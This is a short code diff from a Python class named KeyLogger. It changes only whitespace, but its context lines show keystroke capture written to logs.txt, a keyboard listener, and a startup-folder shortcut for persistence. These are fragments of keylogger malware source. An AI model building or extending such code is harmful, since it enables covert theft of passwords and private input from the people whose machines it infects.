@@ -19,6 +19,7 @@ class KeyLogger:
             winshell.CreateShortcut(Path=path, Target=target)
         else:
             print("(!) .EXE file missing.")
+
     def check_startup(self):
         path = os.path.join(self.startupDir, "main.lnk")
         exist = os.path.isfile(path)
@@ -32,7 +33,6 @@ class KeyLogger:
         time = datetime.now().replace(microsecond=0)
         with open("logs.txt", "a+") as f:
             f.write(f"{time} | {key}\n")
-
 
     def key_listener(self):
         with keyboard.Listener(on_press=self.on_press) as kl:
